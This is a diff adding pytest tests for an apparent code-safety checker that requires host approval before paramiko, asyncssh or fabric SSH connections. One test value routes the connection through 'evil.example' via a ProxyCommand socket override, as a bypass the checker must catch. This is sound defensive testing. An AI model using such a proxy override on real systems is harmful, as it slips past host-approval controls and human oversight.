@@ -686,3 +686,57 @@ def test_asyncio_local_commands_remain_allowed(code):
 )
 def test_asyncio_dynamic_commands_fail_closed(code):
     assert _check_code_safety(code, session_id = "review") is not None
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        "import paramiko; Factory=paramiko.SSHClient; Factory().connect(hostname='approved.example')",
+        "import paramiko; Factory=paramiko.SSHClient; c=Factory(); c.connect(hostname='approved.example')",
+        "import asyncssh; fn=asyncssh.connect; fn('approved.example',config=None)",
+        "import fabric; Factory=fabric.Connection; Factory('approved.example',config=fabric.Config(lazy=True))",
+    ],
+)
+def test_assigned_apis_require_approval(code):
+    assert _check_code_safety(code, session_id = "review") is not None
+    approve_hosts("review", ["approved.example"])
+    assert _check_code_safety(code, session_id = "review") is None
+
+
+@pytest.mark.parametrize(
+    "kwargs",
+    [
+        "{'sock': paramiko.ProxyCommand('ssh -F none evil.example -W approved.example:22')}",
+        "options",
+        "{**options}",
+    ],
+)
+def test_fabric_socket_override_requires_block(kwargs):
+    approve_hosts("review", ["approved.example"])
+    code = f"import fabric,paramiko; fabric.Connection('approved.example',config=fabric.Config(lazy=True),connect_kwargs={kwargs}).run('true')"
+    assert _check_code_safety(code, session_id = "review") is not None
+
+
+@pytest.mark.parametrize(
+    "kwargs",
+    [
+        "None",
+        "{}",
+        "{'sock': None}",
+        "{'password': password, 'allow_agent': False, 'look_for_keys': False}",
+    ],
+)
+def test_fabric_explicit_connect_options_preserve_approval(kwargs):
+    approve_hosts("review", ["approved.example"])
+    code = f"import fabric; fabric.Connection('approved.example', config=fabric.Config(lazy=True), connect_kwargs={kwargs}).run('true')"
+    assert _check_code_safety(code, session_id = "review") is None
+
+
+@pytest.mark.parametrize(
+    "binding", ["connect=client.connect", "first=client.connect; connect=first"]
+)
+def test_bound_client_connect_alias_requires_approval(binding):
+    code = f"import paramiko; client=paramiko.SSHClient(); {binding}; connect(hostname='approved.example')"
+    assert _check_code_safety(code, session_id = "review") is not None
+    approve_hosts("review", ["approved.example"])
+    assert _check_code_safety(code, session_id = "review") is None
